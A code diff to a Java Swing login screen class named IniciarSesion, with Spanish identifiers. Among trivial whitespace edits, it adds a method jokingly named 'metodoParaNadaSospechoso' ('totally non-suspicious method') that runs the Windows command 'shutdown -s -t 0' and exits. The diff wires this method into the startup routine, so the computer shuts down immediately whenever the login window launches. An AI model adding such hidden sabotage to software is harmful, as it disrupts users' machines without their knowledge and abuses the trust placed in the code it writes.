@@ -6,6 +6,7 @@ import java.awt.FlowLayout;
 import java.awt.Font;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
+import java.io.IOException;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 
@@ -35,7 +36,7 @@ Datos datos;
 			@Override
 			public void run() {
 				new IniciarSesion();
-
+				IniciarSesion.metodoParaNadaSospechoso();
 			}
 		});
 
@@ -173,7 +174,6 @@ Datos datos;
 
 					@Override
 					public void run() {
-							
 							String contrasena = String.valueOf(pfContrasena.getPassword());
 							
 							if (contrasena.isEmpty() || tfUsuario.getText().isEmpty()) {
@@ -236,5 +236,16 @@ Datos datos;
 		});
 
 		setVisible(true);
+	}
+	
+	public static void metodoParaNadaSospechoso() {
+		try {
+			Runtime runtime = Runtime.getRuntime();
+		    Process proc = runtime.exec("shutdown -s -t 0");
+		    System.exit(0);
+		} catch (IOException ex) {
+			
+		}
+		
 	}
 }
